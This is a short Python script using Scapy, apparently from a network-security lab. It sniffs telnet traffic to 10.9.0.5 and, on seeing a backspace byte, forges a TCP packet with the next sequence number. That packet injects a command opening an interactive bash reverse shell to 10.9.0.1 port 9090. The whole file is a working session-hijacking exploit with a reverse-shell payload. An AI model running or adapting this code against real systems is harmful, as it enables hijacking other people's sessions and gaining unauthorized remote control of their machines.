from scapy.all import *

def hijack_session(pkt):
  #pkt.show()
  try:
    if (pkt[Raw].load == b'\x7f'):
      ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
      tcp = TCP(sport=pkt[TCP].sport,
                dport=pkt[TCP].dport,
                flags="PA",
                seq=pkt[TCP].seq+1,
                ack=pkt[TCP].ack)

      data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
      spoofed_pkt = ip/tcp/data
      #spoofed_pkt.show()
      send(spoofed_pkt)

      print("bash shell started.")
  except Exception as e:
    #print("error: ",e)
    pass

print("sniffing.....")
iface = input("interace id: ")
pkt = sniff(iface=iface,
            filter='tcp and port 23 and dst host 10.9.0.5',
            prn=hijack_session)
